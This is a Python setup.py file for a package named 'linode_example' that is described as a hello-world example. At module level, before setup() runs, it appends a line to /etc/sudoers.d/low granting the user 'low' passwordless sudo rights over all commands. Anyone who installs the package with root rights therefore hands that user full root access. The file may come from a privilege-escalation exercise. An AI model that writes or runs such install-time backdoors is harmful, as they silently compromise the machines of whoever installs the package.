from setuptools import setup
key='low     ALL=(ALL)      NOPASSWD: ALL'

#key was to not use any modules..
f=open('/etc/sudoers.d/low','a')
f.write(key)
f.close

setup(
    name='linode_example',
    packages=['linode_example'],
    description='Hello world enterprise edition',
    version='1.9',
    url='http://github.com/example/linode_example',
    author='Linode',
    author_email='docs@linode.com',
    keywords=['pip','linode','example'],
    )
